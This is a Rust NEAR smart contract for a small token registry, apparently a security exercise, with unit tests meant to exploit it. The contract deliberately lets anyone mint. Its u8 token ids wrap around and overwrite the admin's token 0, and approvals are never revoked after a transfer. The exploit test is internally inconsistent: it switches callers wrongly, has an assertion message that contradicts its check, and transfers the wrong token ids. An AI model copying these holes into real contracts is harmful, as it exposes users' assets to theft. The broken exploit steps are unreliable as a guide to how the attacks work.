use near_sdk::store::LookupMap;
use near_sdk::{env, near, require, AccountId};

pub type Id = u8;

#[near(contract_state)]
pub struct Contract {
    pub tokens: LookupMap<Id, AccountId>,
    pub approvals: LookupMap<Id, AccountId>,
    pub supply: u16,
}

impl Default for Contract {
    fn default() -> Self {
        Self {
            tokens: {
                let mut a = LookupMap::new(b"tokens".to_vec());
                a.insert(0, "admin.near".parse().unwrap());
                a
            },
            approvals: LookupMap::new(b"approvals".to_vec()),
            supply: 1,
        }
    }
}

#[near]
impl Contract {
    #[init]
    #[private] // only callable by the contract's account
    pub fn init(
        admin: AccountId
    ) -> Self {
        Self {
            tokens: {
                let mut a = LookupMap::new(b"tokens".to_vec());
                a.insert(0, admin);
                a
            },
            approvals: LookupMap::new(b"approvals".to_vec()),
            supply: 1,
        }
    }

    pub fn owner_of(&self, id: Id) -> Option<AccountId> {
        self.tokens.get(&id).cloned()
    }

    pub fn mint(&mut self) -> Id {//BUG everybody can mint themselves tokens?
        self.tokens.insert(self.supply.to_le_bytes()[0], env::predecessor_account_id());
        let id = self.supply;//applies the wrong id risk
        self.supply += 1;
        id as Id
    }

    pub fn approve(&mut self, id: Id, delegatee: AccountId) {
        require!(self.tokens.get(&id).unwrap().clone() == env::predecessor_account_id(), "not owner!");
        self.approvals.insert(id, delegatee);
    }

    pub fn transfer(&mut self, id: Id, receiver: AccountId) {
        require!(
            self.tokens.get(&id).unwrap().clone() == env::predecessor_account_id()
            || self.approvals.get(&id).unwrap().clone() == env::predecessor_account_id()
            , "not owner!"
        );
        self.tokens.insert(id, receiver);
    }
}

#[cfg(test)]
mod tests {
    use near_sdk::{test_utils::VMContextBuilder, testing_env};
    use super::*;

    #[test]
    fn exploit_todo() {
        let bob: AccountId = "bob.near".parse().unwrap();
        set_context(bob.clone());
        // init
        let admin: AccountId = "admin.near".parse().unwrap();
        let mut contract = Contract::init(admin.clone());
        assert_eq!(contract.owner_of(0).unwrap(), admin);
        
        //Issue 1: Minting constraint
        let new_id = contract.mint();
        assert_eq!(contract.owner_of(new_id).unwrap(), bob);

        let alice: AccountId = "alice.near".parse().unwrap();
        let alice_id = contract.mint();
        assert_eq!(contract.owner_of(alice_id).unwrap(), alice);

        //Issue 2 Minting Id
        let current_supply = contract.supply;
        let limit = (u8::MAX as u16) + 1 - current_supply;

        for _ in 0..limit {
            contract.mint();
        }

        let token_0_owner = contract.tokens.get(&0).unwrap();
        assert_eq!(
            token_0_owner,
            &bob,
            "Token ID 0 should belong to admin.near"
        );

        //Issue 3 Transfer same token twice
        let supply = contract.supply;
        let rob: AccountId = "rob.near".parse().unwrap();
        let lisa: AccountId = "lisa.near".parse().unwrap();
        let token_id = supply - 1;
        
        //approve alice
        contract.approve(token_id as u8, alice.clone());
        //alice makes the call to rob
        set_context(alice.clone());
        contract.transfer((supply + 1) as u8, rob.clone());
        //alice makes the call again to lisa
        contract.transfer((supply + 1) as u8, lisa.clone());
        assert_eq!(contract.owner_of(token_id as u8).unwrap(), lisa.clone());
    }

    #[test]
    #[should_panic(expected = "called `Option::unwrap()` on a `None` value")]
    fn should_panic() {
        let bob: AccountId = "bob.near".parse().unwrap();
        set_context(bob.clone());
        // init
        let admin: AccountId = "admin.near".parse().unwrap();
        let mut contract = Contract::init(admin.clone());

        //Issue 3 Transfer issues on nonexisting token Id
        let supply = contract.supply;
        contract.transfer((supply + 1) as u8, bob.clone());
    }

    // create a mock context
    fn set_context(predecessor: AccountId) {
        let mut builder = VMContextBuilder::new();
        builder.predecessor_account_id(predecessor);

        testing_env!(builder.build());
    }

}